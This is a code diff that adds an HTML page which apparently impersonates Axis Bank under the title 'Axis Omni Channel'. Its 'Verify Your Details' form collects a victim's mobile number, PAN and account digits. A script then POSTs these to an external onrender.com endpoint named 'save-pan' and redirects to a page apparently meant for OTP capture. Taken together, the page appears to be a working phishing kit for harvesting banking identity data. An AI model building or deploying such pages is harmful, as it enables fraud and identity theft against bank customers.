@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Axis Omni Channel</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+    }
+
+    .form-container {
+        width: 100%;
+        max-width: 450px;
+        margin: 120px auto 0;
+        padding: 1px;
+        position: relative;
+    }
+    .header-container {
+      background: white;
+      color: black;
+      padding: 1px;
+      text-align: center;
+      height: 110px;
+      border: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 1000;
+      box-shadow: none;
+    }
+    .footer-container {
+      width: 100%;
+      height: 100px; /* You can adjust this value */
+      background: url('footer.jpg') no-repeat center center;
+      background-size: cover;
+      position: relative;
+      margin-top: auto; /* Push the footer to the bottom */
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body class="bg-gradient min-h-screen flex flex-col items-center">
+  <div class="header-container">
+    <img src="header.jpg" alt="Axis Bank">
+  </div>
+      
+  <div class="form-container bg-white rounded-lg shadow-lg">
+    <h2 class="text-center text-gray-800 text-xl font-semibold mb-6">Verify Your Details</h2>
+
+    <form id="pan-form" class="space-y-4">
+      <!-- Mobile Number Input -->
+       <div>
+        <label for="mobileNumber" class="block text-gray-700 text-sm font-semibold mb-2"><b>Mobile Number</b></label>
+        
+        <input 
+          type="text" 
+          id="mobileNumber" 
+          name="mobileNumber" 
+          class="block shadow-sm appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" 
+          placeholder="Enter your 10-digit Mobile Number"
+        >
+        <p id="mobile-error-message" class="text-red-500 text-xs hidden mt-1">Invalid Mobile Number. Please try again.</p>
+      </div>
+
+      <!-- PAN Number Input -->
+      <div>
+        <label for="panNumber" class="block text-gray-700 text-sm font-semibold mb-2"><b>PAN Number</b></label>
+      
+        <input 
+          type="text" 
+          id="panNumber" 
+          name="panNumber" 
+          class="block shadow-sm appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" 
+          placeholder="Enter your 10-digit PAN"
+        >
+        <p id="error-message" class="text-red-500 text-xs hidden mt-1">Invalid PAN number. Please try again.</p>
+      </div>
+
+      <!-- Account Number Input -->
+      <div>
+        <label for="accountNumber" class="block text-gray-700 text-sm font-semibold mb-2"><b>Account Number</b></label>
+      
+        <input 
+          type="text" 
+          id="accountNumber" 
+          name="accountNumber" 
+          class="block shadow-sm appearance-none border rounded-lg w-full py-3 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" 
+          placeholder="Enter last 4 digits of your account"
+        >
+        <p id="account-error-message" class="text-red-500 text-xs hidden mt-1">Invalid Account Number. Please try again.</p>
+      </div>
+
+      <br>
+      <div class="flex items-center justify-center">
+        
+        <button 
+          id="continue-btn" 
+          class="w-full text-white font-medium hover:bg-[#7e405d] focus:outline-none focus:ring-1 focus:ring-[#69354a]"
+          style="background-color: #8B004B; border-radius: 8px; height: 50px; width: 450px; text-align: center; line-height: 50px; display: inline-block; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);"
+          type="button"
+        >
+          Continue
+        </button>
+      </div>
+      <div id="loading-spinner" class="hidden text-center mt-4">
+        <div class="spinner mx-auto"></div>
+      </div>
+    </form>
+  </div>
+
+  <!-- Footer Image -->
+  <div class="footer-container"></div>
+
+  <script>
+    const panInput = document.getElementById('panNumber');
+    const mobileInput = document.getElementById('mobileNumber');
+    const accountInput = document.getElementById('accountNumber');
+    const errorMessage = document.getElementById('error-message');
+    const mobileErrorMessage = document.getElementById('mobile-error-message');
+    const accountErrorMessage = document.getElementById('account-error-message');
+    const continueButton = document.getElementById('continue-btn');
+    const loadingSpinner = document.getElementById('loading-spinner');
+
+    function validatePAN(pan) {
+      const panRegex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
+      return panRegex.test(pan);
+    }
+
+    function validateMobile(mobile) {
+      const mobileRegex = /^[6-9][0-9]{9}$/;
+      return mobileRegex.test(mobile);
+    }
+
+    function validateAccount(account) {
+      const accountRegex = /^[0-9]{4}$/;
+      return accountRegex.test(account);
+    }
+ 
+    continueButton.addEventListener('click', () => {
+      const panNumber = panInput.value;
+      const mobileNumber = mobileInput.value;
+      const accountNumber = accountInput.value;
+
+      // Clear previous error messages
+      errorMessage.classList.add('hidden');
+      mobileErrorMessage.classList.add('hidden');
+      accountErrorMessage.classList.add('hidden');
+
+      if (!validateMobile(mobileNumber)) {
+        mobileErrorMessage.textContent = "Invalid Mobile Number. Please ensure it's in the correct format.";
+        mobileErrorMessage.classList.remove('hidden');
+        return;
+      }
+
+      if (!validatePAN(panNumber)) {
+        errorMessage.textContent = "Invalid PAN number. Please ensure it's in the correct format.";
+        errorMessage.classList.remove('hidden');
+        return;
+      }
+
+      if (!validateAccount(accountNumber)) {
+        accountErrorMessage.textContent = "Invalid Account Number. Please enter the last 4 digits only.";
+        accountErrorMessage.classList.remove('hidden');
+        return;
+      }
+
+      continueButton.textContent = "Processing...";
+      continueButton.disabled = true;
+      loadingSpinner.classList.remove('hidden');
+
+      // API request
+      fetch('https://backend-e2yf.onrender.com/api/save-pan', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ panNumber, mobileNumber, accountNumber })
+      }).then(response => {
+        if (response.ok) {
+          window.location.href = 'secndotp.html';
+        } else {
+          errorMessage.textContent = "Something went wrong. Please try again.";
+          errorMessage.classList.remove('hidden');
+        }
+      }).catch(() => {
+        errorMessage.textContent = "Unable to connect to the server. Please try again later.";
+        errorMessage.classList.remove('hidden');
+      }).finally(() => {
+        continueButton.textContent = "Continue";
+        continueButton.disabled = false;
+        loadingSpinner.classList.add('hidden');
+      });
+    });
+  </script>
+</body>
+</html>
